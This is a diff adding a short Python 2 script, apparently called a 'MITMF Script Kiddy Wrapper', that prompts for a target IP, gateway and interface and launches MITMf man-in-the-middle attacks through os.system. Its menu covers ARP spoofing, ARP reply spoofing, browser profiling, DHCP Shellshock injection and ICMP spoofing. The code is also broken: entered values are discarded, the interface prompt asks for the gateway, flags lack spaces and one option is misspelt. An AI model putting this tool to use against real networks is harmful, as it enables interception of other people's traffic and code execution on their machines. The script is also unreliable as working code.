@@ -1,0 +1,79 @@
+#!/usr/bin/python
+
+ip="127.0.0.1"
+gateway="127.0.0.1"
+menuOption=0;
+interface="eth0"
+
+def WriteMainMenu():
+    print"___________________________________________"
+    print"|         	***MAIN MENU***         	|"
+    print"|                                     	|"
+    print"|NOTE:Here is how its gonna work. You give|"
+    print"|me the target IP, Gateway, and what you  |"
+    print"|want to do and ill do the rest       	|"
+    print"|_________________________________________|"
+    return
+    
+def WriteMenuOptions():
+    print"_________________________________________"
+    print"|       	MAIN ATTACK OPTIONS     	|"
+    print"|_______________________________________|"
+    print"|1. Arp-Spoof   	2. Arp-Reply-Spoof  |"
+    print"|3. Browser-Profile 4. DHCP-ShellShock  |"
+    print"|5. ICMP-Spoof                      	|"
+    print"|_______________________________________|"
+    return
+    
+def GetIP():
+    ip= raw_input("\nPlease Enter Targets IP:")
+    return ip
+    
+def GetGateway():
+    gateway= raw_input("\nPlease Enter Targets Gateway or router:")
+    return gateway
+    
+def GetInterface():
+    interface= raw_input("\nPlease Enter Targets Gateway or router:")
+    return interface    
+    
+def GetMenuSelection():
+    menuOption=raw_input("\nSelect What you would like to do:")
+    return menuOption
+    
+def WrtieIntro():    
+    print "-----------------------------------------"
+    print "Welcome to the MITMF Script Kiddy Wrapper"
+    print "-----------------------------------------"
+
+WrtieIntro()
+WriteMainMenu()
+GetIP()
+GetGateway()
+GetInterface()
+WriteMenuOptions()
+
+import os
+
+while True:
+    menuOption=GetMenuSelection()
+    if menuOption=="1":
+   	 os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway"+gateway+" --target "+ip)
+   	 break
+    elif menuOption=="2":
+   	 os.system("mitmf -i "+interface+" --arp --spoof --gateway"+gateway+" --target "+ip+"--mode rep")
+   	 break
+    elif menuOption=="3":
+   	 os.system("mitmf -i "+interface+" --arp --spoof --gateway"+gateway+" --target "+ip+"--browserprofiler")
+   	 break
+    elif menuOption=="4":
+   	 os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock")
+   	 break
+    elif menuOption=="5":
+   	 os.system("mitmf -i "+interface+" --spoof --imcp --gateway"+gateway+" --target "+ip)
+   	 break
+    else:
+   	 whileLoopBool=False
+   	 print"Invalid Selection slick, Try again, and get it right this time."
+   	 WriteMenuOptions()
+print "STARTING PROGRAM HAPPY TESTING :D \n\n"
